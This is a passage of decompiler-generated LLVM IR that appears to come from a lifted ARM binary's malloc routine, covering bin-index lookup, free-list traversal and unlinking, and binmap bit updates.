  %v1_11e44 = add i32 %v3_11f84, 12
  %v2_11e44 = inttoptr i32 %v1_11e44 to i32*
  %v3_11e44 = load i32, i32* %v2_11e44, align 4
  store i32 %v3_11e44, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_11e3c, 255
  br i1 %tmp206, label %dec_label_pc_11ea0, label %dec_label_pc_11e4c

dec_label_pc_11e4c:                               ; preds = %dec_label_pc_11e38
  %v9_11e4c = icmp eq i32 %v3_11e44, %v0_11ea4
  br i1 %v9_11e4c, label %dec_label_pc_11e54, label %dec_label_pc_11ea0

dec_label_pc_11e54:                               ; preds = %dec_label_pc_11e4c
  %v0_11e54 = load i32, i32* @sb, align 4
  %v1_11e54 = add i32 %v0_11e54, 48
  %v2_11e54 = inttoptr i32 %v1_11e54 to i32*
  %v3_11e54 = load i32, i32* %v2_11e54, align 4
  store i32 %v3_11e54, i32* %r3.global-to-local, align 4
  %v9_11e58 = icmp eq i32 %v3_11f84, %v3_11e54
  br i1 %v9_11e58, label %dec_label_pc_11e60, label %dec_label_pc_11ea0

dec_label_pc_11e60:                               ; preds = %dec_label_pc_11e54
  %v1_11e60 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_11e40, %v1_11e60
  br i1 %tmp207, label %dec_label_pc_11e68, label %dec_label_pc_11ea0

dec_label_pc_11e68:                               ; preds = %dec_label_pc_11e60
  %v2_11e68 = sub i32 %v1_11e40, %v0_11e3c
  store i32 %v2_11e68, i32* %r2.global-to-local, align 4
  %v2_11e6c = add i32 %v0_11e3c, %v3_11f84
  store i32 %v2_11e6c, i32* %r3.global-to-local, align 4
  %v1_11e70 = or i32 %v0_11e3c, 1
  store i32 %v1_11e70, i32* %r0.global-to-local, align 4
  %v1_11e74 = or i32 %v2_11e68, 1
  store i32 %v1_11e74, i32* %r1.global-to-local, align 4
  %v1_11e78 = add i32 %v3_11f84, 8
  store i32 %v1_11e78, i32* %r4.global-to-local, align 4
  %v2_11e7c = add i32 %v0_11ea4, 8
  %v3_11e7c = inttoptr i32 %v2_11e7c to i32*
  store i32 %v2_11e6c, i32* %v3_11e7c, align 4
  %v0_11e80 = load i32, i32* %r3.global-to-local, align 4
  %v1_11e80 = load i32, i32* %ip.global-to-local, align 4
  %v2_11e80 = add i32 %v1_11e80, 12
  %v3_11e80 = inttoptr i32 %v2_11e80 to i32*
  store i32 %v0_11e80, i32* %v3_11e80, align 4
  %v0_11e84 = load i32, i32* %r0.global-to-local, align 4
  %v1_11e84 = load i32, i32* @r6, align 4
  %v2_11e84 = add i32 %v1_11e84, 4
  %v3_11e84 = inttoptr i32 %v2_11e84 to i32*
  store i32 %v0_11e84, i32* %v3_11e84, align 4
  %v0_11e88 = load i32, i32* %r3.global-to-local, align 4
  %v1_11e88 = load i32, i32* @sb, align 4
  %v2_11e88 = add i32 %v1_11e88, 48
  %v3_11e88 = inttoptr i32 %v2_11e88 to i32*
  store i32 %v0_11e88, i32* %v3_11e88, align 4
  %v0_11e8c = load i32, i32* %r2.global-to-local, align 4
  %v1_11e8c = load i32, i32* %r3.global-to-local, align 4
  %v3_11e8c = add i32 %v1_11e8c, %v0_11e8c
  %v4_11e8c = inttoptr i32 %v3_11e8c to i32*
  store i32 %v0_11e8c, i32* %v4_11e8c, align 4
  %v0_11e90 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e90 = load i32, i32* %r3.global-to-local, align 4
  %v2_11e90 = add i32 %v1_11e90, 4
  %v3_11e90 = inttoptr i32 %v2_11e90 to i32*
  store i32 %v0_11e90, i32* %v3_11e90, align 4
  %v0_11e94 = load i32, i32* %ip.global-to-local, align 4
  %v1_11e94 = load i32, i32* %r3.global-to-local, align 4
  %v2_11e94 = add i32 %v1_11e94, 12
  %v3_11e94 = inttoptr i32 %v2_11e94 to i32*
  store i32 %v0_11e94, i32* %v3_11e94, align 4
  %v0_11e98 = load i32, i32* %ip.global-to-local, align 4
  %v1_11e98 = load i32, i32* %r3.global-to-local, align 4
  %v2_11e98 = add i32 %v1_11e98, 8
  %v3_11e98 = inttoptr i32 %v2_11e98 to i32*
  store i32 %v0_11e98, i32* %v3_11e98, align 4
  br label %dec_label_pc_125c8

dec_label_pc_11ea0:                               ; preds = %dec_label_pc_11e60, %dec_label_pc_11e54, %dec_label_pc_11e4c, %dec_label_pc_11e38
  %v9_11ea0 = icmp eq i32 %v1_11e40, %v0_11e3c
  %v2_11ea4 = add i32 %v3_11e44, 8
  %v3_11ea4 = inttoptr i32 %v2_11ea4 to i32*
  store i32 %v0_11ea4, i32* %v3_11ea4, align 4
  %v0_11ea8 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ea8 = load i32, i32* %r5.global-to-local, align 4
  %v2_11ea8 = add i32 %v1_11ea8, 12
  %v3_11ea8 = inttoptr i32 %v2_11ea8 to i32*
  store i32 %v0_11ea8, i32* %v3_11ea8, align 4
  br i1 %v9_11ea0, label %dec_label_pc_12000.loopexit, label %dec_label_pc_11ebc

dec_label_pc_11ebc:                               ; preds = %dec_label_pc_11ea0
  %v0_11ebc = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_11ebc, 255
  br i1 %tmp208, label %dec_label_pc_11ee0, label %dec_label_pc_11ec4

dec_label_pc_11ec4:                               ; preds = %dec_label_pc_11ebc
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r2.global-to-local, align 4
  %v1_11ec8 = load i32, i32* %r8.global-to-local, align 4
  %v2_11ec8 = add i32 %v1_11ec8, ptrtoint (i32* @global_var_219e0.355 to i32)
  %v3_11ec8 = inttoptr i32 %v2_11ec8 to i32*
  %v4_11ec8 = load i32, i32* %v3_11ec8, align 4
  %v3_11ecc = udiv i32 %v0_11ebc, 8
  store i32 %v3_11ecc, i32* %r0.global-to-local, align 4
  %v4_11ed0 = mul nuw i32 %v3_11ecc, 8
  %v5_11ed0 = add i32 %v4_11ec8, %v4_11ed0
  store i32 %v5_11ed0, i32* %r3.global-to-local, align 4
  %v1_11ed4 = add i32 %v5_11ed0, 44
  store i32 %v1_11ed4, i32* %ip.global-to-local, align 4
  %v1_11ed8 = add i32 %v5_11ed0, 52
  %v2_11ed8 = inttoptr i32 %v1_11ed8 to i32*
  %v3_11ed8 = load i32, i32* %v2_11ed8, align 4
  store i32 %v3_11ed8, i32* @lr, align 4
  br label %dec_label_pc_11f38

dec_label_pc_11ee0:                               ; preds = %dec_label_pc_11ebc
  store i32 %v0_11ebc, i32* %r0.global-to-local, align 4
  %v1_11ee4 = call i32 @__malloc_largebin_index(i32 %v0_11ebc)
  store i32 %v1_11ee4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %ip.global-to-local, align 4
  %v1_11eec = load i32, i32* %r8.global-to-local, align 4
  %v2_11eec = add i32 %v1_11eec, ptrtoint (i32* @global_var_219e0.355 to i32)
  %v3_11eec = inttoptr i32 %v2_11eec to i32*
  %v4_11eec = load i32, i32* %v3_11eec, align 4
  %v4_11ef0 = mul i32 %v1_11ee4, 8
  %v5_11ef0 = add i32 %v4_11eec, %v4_11ef0
  store i32 %v5_11ef0, i32* %r3.global-to-local, align 4
  %v1_11ef4 = add i32 %v5_11ef0, 44
  store i32 %v1_11ef4, i32* %ip.global-to-local, align 4
  %v1_11ef8 = add i32 %v5_11ef0, 52
  %v2_11ef8 = inttoptr i32 %v1_11ef8 to i32*
  %v3_11ef8 = load i32, i32* %v2_11ef8, align 4
  store i32 %v3_11ef8, i32* @lr, align 4
  %v9_11efc = icmp eq i32 %v3_11ef8, %v1_11ef4
  br i1 %v9_11efc, label %dec_label_pc_11f38, label %dec_label_pc_11f04

dec_label_pc_11f04:                               ; preds = %dec_label_pc_11ee0
  %v1_11f04 = add i32 %v5_11ef0, 56
  %v2_11f04 = inttoptr i32 %v1_11f04 to i32*
  %v3_11f04 = load i32, i32* %v2_11f04, align 4
  store i32 %v3_11f04, i32* %r1.global-to-local, align 4
  %v1_11f08 = add i32 %v3_11f04, 4
  %v2_11f08 = inttoptr i32 %v1_11f08 to i32*
  %v3_11f08 = load i32, i32* %v2_11f08, align 4
  store i32 %v3_11f08, i32* %r3.global-to-local, align 4
  %v0_11f0c = load i32, i32* %r4.global-to-local, align 4
  %v3_11f0c = icmp ult i32 %v0_11f0c, %v3_11f08
  br i1 %v3_11f0c, label %.thread, label %dec_label_pc_11f28.preheader

.thread:                                          ; preds = %dec_label_pc_11f04
  store i32 %v1_11ef4, i32* @lr, align 4
  store i32 %v3_11f04, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11f38

dec_label_pc_11f28.preheader:                     ; preds = %dec_label_pc_11f04
  %v2_11f14 = or i32 %v0_11f0c, 1
  store i32 %v2_11f14, i32* %r2.global-to-local, align 4
  %v1_11f28182 = add i32 %v3_11ef8, 4
  %v2_11f28183 = inttoptr i32 %v1_11f28182 to i32*
  %v3_11f28184 = load i32, i32* %v2_11f28183, align 4
  store i32 %v3_11f28184, i32* %r3.global-to-local, align 4
  %v3_11f2c186 = icmp ult i32 %v2_11f14, %v3_11f28184
  br i1 %v3_11f2c186, label %dec_label_pc_11f24, label %dec_label_pc_11f34

dec_label_pc_11f24:                               ; preds = %dec_label_pc_11f28.preheader, %dec_label_pc_11f24
  %v0_11f34187 = phi i32 [ %v3_11f24, %dec_label_pc_11f24 ], [ %v3_11ef8, %dec_label_pc_11f28.preheader ]
  %v1_11f24 = add i32 %v0_11f34187, 8
  %v2_11f24 = inttoptr i32 %v1_11f24 to i32*
  %v3_11f24 = load i32, i32* %v2_11f24, align 4
  store i32 %v3_11f24, i32* @lr, align 4
  %v1_11f28 = add i32 %v3_11f24, 4
  %v2_11f28 = inttoptr i32 %v1_11f28 to i32*
  %v3_11f28 = load i32, i32* %v2_11f28, align 4
  store i32 %v3_11f28, i32* %r3.global-to-local, align 4
  %v3_11f2c = icmp ult i32 %v2_11f14, %v3_11f28
  br i1 %v3_11f2c, label %dec_label_pc_11f24, label %dec_label_pc_11f34

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11f24, %dec_label_pc_11f28.preheader
  %v0_11f34.lcssa = phi i32 [ %v3_11ef8, %dec_label_pc_11f28.preheader ], [ %v3_11f24, %dec_label_pc_11f24 ]
  %v1_11f34 = add i32 %v0_11f34.lcssa, 12
  %v2_11f34 = inttoptr i32 %v1_11f34 to i32*
  %v3_11f34 = load i32, i32* %v2_11f34, align 4
  store i32 %v3_11f34, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11f38

dec_label_pc_11f38:                               ; preds = %.thread, %dec_label_pc_11ee0, %dec_label_pc_11ec4, %dec_label_pc_11f34
  %v0_11f58 = phi i32 [ %v1_11ef4, %dec_label_pc_11ee0 ], [ %v1_11ed4, %dec_label_pc_11ec4 ], [ %v3_11f34, %dec_label_pc_11f34 ], [ %v3_11f04, %.thread ]
  %v0_11f4c = phi i32 [ %v1_11ee4, %dec_label_pc_11ee0 ], [ %v3_11ecc, %dec_label_pc_11ec4 ], [ %v1_11ee4, %dec_label_pc_11f34 ], [ %v1_11ee4, %.thread ]
  %v1_11f3c = phi i32 [ %v1_11eec, %dec_label_pc_11ee0 ], [ %v1_11ec8, %dec_label_pc_11ec4 ], [ %v1_11eec, %dec_label_pc_11f34 ], [ %v1_11eec, %.thread ]
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r2.global-to-local, align 4
  %v2_11f3c = add i32 %v1_11f3c, ptrtoint (i32* @global_var_219e0.355 to i32)
  %v3_11f3c = inttoptr i32 %v2_11f3c to i32*
  %v4_11f3c = load i32, i32* %v3_11f3c, align 4
  %v3_11f40 = sdiv i32 %v0_11f4c, 32
  store i32 %v3_11f40, i32* %r3.global-to-local, align 4
  %v4_11f44 = mul nsw i32 %v3_11f40, 4
  %v5_11f44 = add i32 %v4_11f3c, %v4_11f44
  store i32 %v5_11f44, i32* %r1.global-to-local, align 4
  %v1_11f48 = add i32 %v5_11f44, 820
  %v2_11f48 = inttoptr i32 %v1_11f48 to i32*
  %v3_11f48 = load i32, i32* %v2_11f48, align 4
  %v1_11f4c = urem i32 %v0_11f4c, 32
  store i32 %v1_11f4c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_11f54 = shl i32 1, %v1_11f4c
  %v8_11f54 = or i32 %v3_11f48, %v7_11f54
  store i32 %v8_11f54, i32* %r3.global-to-local, align 4
  %v1_11f58 = load i32, i32* @r6, align 4
  %v2_11f58 = add i32 %v1_11f58, 12
  %v3_11f58 = inttoptr i32 %v2_11f58 to i32*
  store i32 %v0_11f58, i32* %v3_11f58, align 4
  %v0_11f5c = load i32, i32* @lr, align 4
  %v1_11f5c = load i32, i32* @r6, align 4
  %v2_11f5c = add i32 %v1_11f5c, 8
  %v3_11f5c = inttoptr i32 %v2_11f5c to i32*
  store i32 %v0_11f5c, i32* %v3_11f5c, align 4
  %v0_11f60 = load i32, i32* %r3.global-to-local, align 4
  %v1_11f60 = load i32, i32* %r1.global-to-local, align 4
  %v2_11f60 = add i32 %v1_11f60, 820
  %v3_11f60 = inttoptr i32 %v2_11f60 to i32*
  store i32 %v0_11f60, i32* %v3_11f60, align 4
  %v0_11f64 = load i32, i32* @r6, align 4
  %v1_11f64 = load i32, i32* @lr, align 4
  %v2_11f64 = add i32 %v1_11f64, 12
  %v3_11f64 = inttoptr i32 %v2_11f64 to i32*
  store i32 %v0_11f64, i32* %v3_11f64, align 4
  %v0_11f68 = load i32, i32* @r6, align 4
  %v1_11f68 = load i32, i32* %ip.global-to-local, align 4
  %v2_11f68 = add i32 %v1_11f68, 8
  %v3_11f68 = inttoptr i32 %v2_11f68 to i32*
  store i32 %v0_11f68, i32* %v3_11f68, align 4
  %v0_11f84.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11f84

dec_label_pc_11f70:                               ; preds = %dec_label_pc_11e10, %dec_label_pc_11dc8, %dec_label_pc_11e24
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r1.global-to-local, align 4
  %v4_11f78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_11f78, i32* @sb, align 4
  %v0_11f7c = load i32, i32* @sl, align 4
  %v1_11f7c = add i32 %v0_11f7c, 16
  store i32 %v1_11f7c, i32* @fp, align 4
  %v1_11f80 = add i32 %v4_11f78, 52
  store i32 %v1_11f80, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11f84

dec_label_pc_11f84:                               ; preds = %dec_label_pc_11f38, %dec_label_pc_11f70
  %v0_11ea4 = phi i32 [ %v0_11f84.pre, %dec_label_pc_11f38 ], [ %v1_11f80, %dec_label_pc_11f70 ]
  %v1_11f84 = add i32 %v0_11ea4, 12
  %v2_11f84 = inttoptr i32 %v1_11f84 to i32*
  %v3_11f84 = load i32, i32* %v2_11f84, align 4
  store i32 %v3_11f84, i32* @r6, align 4
  %v9_11f88 = icmp eq i32 %v3_11f84, %v0_11ea4
  br i1 %v9_11f88, label %dec_label_pc_11f90, label %dec_label_pc_11e38

dec_label_pc_11f90:                               ; preds = %dec_label_pc_11f84
  %v0_11f90 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_11f90, 256
  %v0_12048.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_11f90.dec_label_pc_12048_crit_edge, label %dec_label_pc_11f98

dec_label_pc_11f90.dec_label_pc_12048_crit_edge:  ; preds = %dec_label_pc_11f90
  %.pre203 = mul i32 %v0_12048.pre, 8
  br label %dec_label_pc_12048

dec_label_pc_11f98:                               ; preds = %dec_label_pc_11f90
  %v4_11f98 = mul i32 %v0_12048.pre, 8
  %v5_11f98 = add i32 %v4_11f98, %v0_11ea4
  store i32 %v5_11f98, i32* %r3.global-to-local, align 4
  %v1_11f9c = add i32 %v5_11f98, -8
  store i32 %v1_11f9c, i32* %r1.global-to-local, align 4
  %v1_11fa0 = add i32 %v5_11f98, 4
  %v2_11fa0 = inttoptr i32 %v1_11fa0 to i32*
  %storemerge.pre = load i32, i32* %v2_11fa0, align 4
  br label %dec_label_pc_12040

dec_label_pc_11fa8:                               ; preds = %dec_label_pc_12040
  %v1_11fa8 = add i32 %v1_11fd0, 4
  %v2_11fa8 = inttoptr i32 %v1_11fa8 to i32*
  %v3_11fa8 = load i32, i32* %v2_11fa8, align 4
  store i32 %v3_11fa8, i32* %r3.global-to-local, align 4
  %v1_11fac = and i32 %v3_11fa8, -4
  store i32 %v1_11fac, i32* %r2.global-to-local, align 4
  %v3_11fb0 = icmp ult i32 %v1_11fac, %v0_11f90
  %v1_11fb4 = add i32 %v1_11fd0, 12
  %v2_11fb4 = inttoptr i32 %v1_11fb4 to i32*
  %v3_11fb4 = load i32, i32* %v2_11fb4, align 4
  store i32 %v3_11fb4, i32* %r0.global-to-local, align 4
  br i1 %v3_11fb0, label %dec_label_pc_12040, label %dec_label_pc_11fbc

dec_label_pc_11fbc:                               ; preds = %dec_label_pc_11fa8
  %v1_11fbc = add i32 %v1_11fd0, 8
  %v2_11fbc = inttoptr i32 %v1_11fbc to i32*
  %v3_11fbc = load i32, i32* %v2_11fbc, align 4
  store i32 %v3_11fbc, i32* %r1.global-to-local, align 4
  %v1_11fc0 = add i32 %v3_11fbc, 12
  %v2_11fc0 = inttoptr i32 %v1_11fc0 to i32*
  %v3_11fc0 = load i32, i32* %v2_11fc0, align 4
  store i32 %v3_11fc0, i32* %r3.global-to-local, align 4
  %v9_11fc4 = icmp eq i32 %v3_11fc0, %v1_11fd0
  br i1 %v9_11fc4, label %dec_label_pc_11fcc, label %dec_label_pc_11fd8

dec_label_pc_11fcc:                               ; preds = %dec_label_pc_11fbc
  %v1_11fcc = add i32 %v3_11fb4, 8
  %v2_11fcc = inttoptr i32 %v1_11fcc to i32*
  %v3_11fcc = load i32, i32* %v2_11fcc, align 4
  store i32 %v3_11fcc, i32* %r3.global-to-local, align 4
  %v9_11fd0 = icmp eq i32 %v3_11fcc, %v1_11fd0
  br i1 %v9_11fd0, label %dec_label_pc_11fdc, label %dec_label_pc_11fd8

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11fbc, %dec_label_pc_11fcc
  %v0_11fd8 = call i32 @abort()
  store i32 %v0_11fd8, i32* %r0.global-to-local, align 4
  %v0_11fdc.pre = load i32, i32* @sl, align 4
  %v1_11fdc.pre = load i32, i32* @r2, align 4
  %v0_11fe4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11fdc

dec_label_pc_11fdc:                               ; preds = %dec_label_pc_11fcc, %dec_label_pc_11fd8
  %v1_11fe4 = phi i32 [ %v3_11fb4, %dec_label_pc_11fcc ], [ %v0_11fd8, %dec_label_pc_11fd8 ]
  %v0_11fe4 = phi i32 [ %v3_11fbc, %dec_label_pc_11fcc ], [ %v0_11fe4.pre, %dec_label_pc_11fd8 ]
  %v1_11fdc = phi i32 [ %v1_11fac, %dec_label_pc_11fcc ], [ %v1_11fdc.pre, %dec_label_pc_11fd8 ]
  %v0_11fdc = phi i32 [ %v0_11f90, %dec_label_pc_11fcc ], [ %v0_11fdc.pre, %dec_label_pc_11fd8 ]
  %v2_11fdc = sub i32 %v1_11fdc, %v0_11fdc
  store i32 %v2_11fdc, i32* %lr.global-to-local, align 4
  %v2_11fe4 = add i32 %v1_11fe4, 8
  %v3_11fe4 = inttoptr i32 %v2_11fe4 to i32*
  store i32 %v0_11fe4, i32* %v3_11fe4, align 4
  %v0_11fe8 = load i32, i32* %r0.global-to-local, align 4
  %v1_11fe8 = load i32, i32* %r1.global-to-local, align 4
  %v2_11fe8 = add i32 %v1_11fe8, 12
  %v3_11fe8 = inttoptr i32 %v2_11fe8 to i32*
  store i32 %v0_11fe8, i32* %v3_11fe8, align 4
  %v0_11fec = load i32, i32* %ip.global-to-local, align 4
  %v1_11fec = add i32 %v0_11fec, 8
  store i32 %v1_11fec, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_11fdc, 15
  br i1 %tmp210, label %dec_label_pc_1200c, label %dec_label_pc_11ff4

dec_label_pc_11ff4:                               ; preds = %dec_label_pc_11fdc
  %v1_11ff4 = load i32, i32* %r2.global-to-local, align 4
  %v2_11ff4 = add i32 %v1_11ff4, %v0_11fec
  store i32 %v2_11ff4, i32* %r2.global-to-local, align 4
  %v1_11ff8 = add i32 %v2_11ff4, 4
  %v2_11ff8 = inttoptr i32 %v1_11ff8 to i32*
  %v3_11ff8 = load i32, i32* %v2_11ff8, align 4
  store i32 %v3_11ff8, i32* %r3.global-to-local, align 4
  store i32 %v1_11fec, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12000

dec_label_pc_12000.loopexit:                      ; preds = %dec_label_pc_11ea0
  %v1_11eac = load i32, i32* @r6, align 4
  %v2_11eac = load i32, i32* @sl, align 4
  %v3_11eac = add i32 %v2_11eac, %v1_11eac
  store i32 %v3_11eac, i32* %r2.global-to-local, align 4
  %v2_11eb0 = add i32 %v3_11eac, 4
  %v3_11eb0 = inttoptr i32 %v2_11eb0 to i32*
  %v4_11eb0 = load i32, i32* %v3_11eb0, align 4
  store i32 %v4_11eb0, i32* %r3.global-to-local, align 4
  %v2_11eb4 = add i32 %v1_11eac, 8
  store i32 %v2_11eb4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12000

dec_label_pc_12000:                               ; preds = %.dec_label_pc_12000_crit_edge, %dec_label_pc_12000.loopexit, %dec_label_pc_11ff4
  %v1_12004 = phi i32 [ %v4_12128, %.dec_label_pc_12000_crit_edge ], [ %v3_11eac, %dec_label_pc_12000.loopexit ], [ %v2_11ff4, %dec_label_pc_11ff4 ]
  %v0_12000 = phi i32 [ %v7_12128, %.dec_label_pc_12000_crit_edge ], [ %v4_11eb0, %dec_label_pc_12000.loopexit ], [ %v3_11ff8, %dec_label_pc_11ff4 ]
  %v1_12000 = or i32 %v0_12000, 1
  store i32 %v1_12000, i32* %r3.global-to-local, align 4
  %v2_12004 = add i32 %v1_12004, 4
  %v3_12004 = inttoptr i32 %v2_12004 to i32*
  store i32 %v1_12000, i32* %v3_12004, align 4
  br label %dec_label_pc_125c8

dec_label_pc_1200c:                               ; preds = %dec_label_pc_11fdc
  %v1_1200c = load i32, i32* @sl, align 4
  %v2_1200c = add i32 %v1_1200c, %v0_11fec
  store i32 %v2_1200c, i32* %r2.global-to-local, align 4
  %v1_12010 = or i32 %v1_1200c, 1
  store i32 %v1_12010, i32* %r3.global-to-local, align 4
  %v0_12014 = load i32, i32* %lr.global-to-local, align 4
  %v1_12014 = or i32 %v0_12014, 1
  store i32 %v1_12014, i32* %r1.global-to-local, align 4
  store i32 %v1_11fec, i32* %r4.global-to-local, align 4
  %v2_1201c = add i32 %v0_11fec, 4
  %v3_1201c = inttoptr i32 %v2_1201c to i32*
  store i32 %v1_12010, i32* %v3_1201c, align 4
  %v0_12020 = load i32, i32* %r2.global-to-local, align 4
  %v1_12020 = load i32, i32* @r6, align 4
  %v2_12020 = add i32 %v1_12020, 8
  %v3_12020 = inttoptr i32 %v2_12020 to i32*
  store i32 %v0_12020, i32* %v3_12020, align 4
  %v0_12024 = load i32, i32* %r2.global-to-local, align 4
  %v1_12024 = load i32, i32* @r6, align 4
  %v2_12024 = add i32 %v1_12024, 12
  %v3_12024 = inttoptr i32 %v2_12024 to i32*
  store i32 %v0_12024, i32* %v3_12024, align 4
  %v0_12028 = load i32, i32* %lr.global-to-local, align 4
  %v1_12028 = load i32, i32* %r2.global-to-local, align 4
  %v3_12028 = add i32 %v1_12028, %v0_12028
  %v4_12028 = inttoptr i32 %v3_12028 to i32*
  store i32 %v0_12028, i32* %v4_12028, align 4
  %v0_1202c = load i32, i32* %r1.global-to-local, align 4
  %v1_1202c = load i32, i32* %r2.global-to-local, align 4
  %v2_1202c = add i32 %v1_1202c, 4
  %v3_1202c = inttoptr i32 %v2_1202c to i32*
  store i32 %v0_1202c, i32* %v3_1202c, align 4
  %v0_12030 = load i32, i32* @r6, align 4
  %v1_12030 = load i32, i32* %r2.global-to-local, align 4
  %v2_12030 = add i32 %v1_12030, 12
  %v3_12030 = inttoptr i32 %v2_12030 to i32*
  store i32 %v0_12030, i32* %v3_12030, align 4
  %v0_12034 = load i32, i32* @r6, align 4
  %v1_12034 = load i32, i32* %r2.global-to-local, align 4
  %v2_12034 = add i32 %v1_12034, 8
  %v3_12034 = inttoptr i32 %v2_12034 to i32*
  store i32 %v0_12034, i32* %v3_12034, align 4
  br label %dec_label_pc_125c8

dec_label_pc_12040:                               ; preds = %dec_label_pc_11fa8, %dec_label_pc_11f98
  %v1_11fd0 = phi i32 [ %storemerge.pre, %dec_label_pc_11f98 ], [ %v3_11fb4, %dec_label_pc_11fa8 ]
  store i32 %v1_11fd0, i32* %ip.global-to-local, align 4
  %v9_12040 = icmp eq i32 %v1_11fd0, %v1_11f9c
  br i1 %v9_12040, label %dec_label_pc_12048.loopexit, label %dec_label_pc_11fa8

dec_label_pc_12048.loopexit:                      ; preds = %dec_label_pc_12040
  br label %dec_label_pc_12048

dec_label_pc_12048:                               ; preds = %dec_label_pc_11f90.dec_label_pc_12048_crit_edge, %dec_label_pc_12048.loopexit
  %v4_12078.pre-phi = phi i32 [ %.pre203, %dec_label_pc_11f90.dec_label_pc_12048_crit_edge ], [ %v4_11f98, %dec_label_pc_12048.loopexit ]
  %v1_12048 = add i32 %v0_12048.pre, 1
  store i32 %v1_12048, i32* %r2.global-to-local, align 4
  %v1_1204c = urem i32 %v1_12048, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r0.global-to-local, align 4
  %v6_12058 = shl i32 1, %v1_1204c
  store i32 %v6_12058, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12060 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_12060, i32* %r3.global-to-local, align 4
  %v3_12064 = udiv i32 %v1_12048, 32
  store i32 %v3_12064, i32* @r5, align 4
  %v4_12068 = mul nuw nsw i32 %v3_12064, 4
  %v5_12068 = add i32 %v4_12060, %v4_12068
  store i32 %v5_12068, i32* %r2.global-to-local, align 4
  %v1_1206c = add i32 %v5_12068, 820
  %v2_1206c = inttoptr i32 %v1_1206c to i32*
  %v3_1206c = load i32, i32* %v2_1206c, align 4
  store i32 %v3_1206c, i32* @r4, align 4
  %v1_12070 = add i32 %v4_12060, 52
  store i32 %v1_12070, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_12078 = add i32 %v1_12070, %v4_12078.pre-phi
  store i32 %v5_12078, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1207c

dec_label_pc_1207c:                               ; preds = %dec_label_pc_120e4, %dec_label_pc_12048
  %v1_12084 = phi i32 [ %v1_12084.pre, %dec_label_pc_120e4 ], [ %v3_1206c, %dec_label_pc_12048 ]
  %v0_12084 = phi i32 [ %v0_1207c.pre, %dec_label_pc_120e4 ], [ %v6_12058, %dec_label_pc_12048 ]
  %v1_1207c = sub i32 1, %v0_12084
  %v2_1207c = icmp ult i32 %v0_12084, 2
  %v1_1207c. = select i1 %v2_1207c, i32 %v1_1207c, i32 0
  store i32 %v1_1207c., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_12084, %v1_12084
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_1207c
  %v5_12088 = or i32 %v1_1207c., 1
  store i32 %v5_12088, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12094.preheader

bb145:                                            ; preds = %dec_label_pc_1207c
  %v2_1208c = icmp eq i32 %v1_1207c., 0
  br i1 %v2_1208c, label %.dec_label_pc_120d0.preheader_crit_edge, label %dec_label_pc_12094.preheader

.dec_label_pc_120d0.preheader_crit_edge:          ; preds = %bb145
  %v0_120c857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_120d0.preheader

dec_label_pc_12094.preheader:                     ; preds = %bb145, %.thread15
  %v0_12094.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12094

dec_label_pc_12094:                               ; preds = %dec_label_pc_12094.preheader, %dec_label_pc_120a0
  %v0_12094 = phi i32 [ %v0_12094.pre, %dec_label_pc_12094.preheader ], [ %v1_12094, %dec_label_pc_120a0 ]
  %v1_12094 = add i32 %v0_12094, 1
  store i32 %v1_12094, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_12094, 2
  br i1 %tmp211, label %dec_label_pc_12174.loopexit, label %dec_label_pc_120a0

dec_label_pc_120a0:                               ; preds = %dec_label_pc_12094
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r3.global-to-local, align 4
  %v1_120a4 = load i32, i32* @r8, align 4
  %v2_120a4 = add i32 %v1_120a4, ptrtoint (i32* @global_var_219e0.355 to i32)
  %v3_120a4 = inttoptr i32 %v2_120a4 to i32*
  %v4_120a4 = load i32, i32* %v3_120a4, align 4
  store i32 %v4_120a4, i32* %r2.global-to-local, align 4
  %v4_120a8 = mul i32 %v1_12094, 4
  %v5_120a8 = add i32 %v4_120a4, %v4_120a8
  store i32 %v5_120a8, i32* %r3.global-to-local, align 4
  %v1_120ac = add i32 %v5_120a8, 820
  %v2_120ac = inttoptr i32 %v1_120ac to i32*
  %v3_120ac = load i32, i32* %v2_120ac, align 4
  store i32 %v3_120ac, i32* @r4, align 4
  %v2_120b0 = icmp eq i32 %v3_120ac, 0
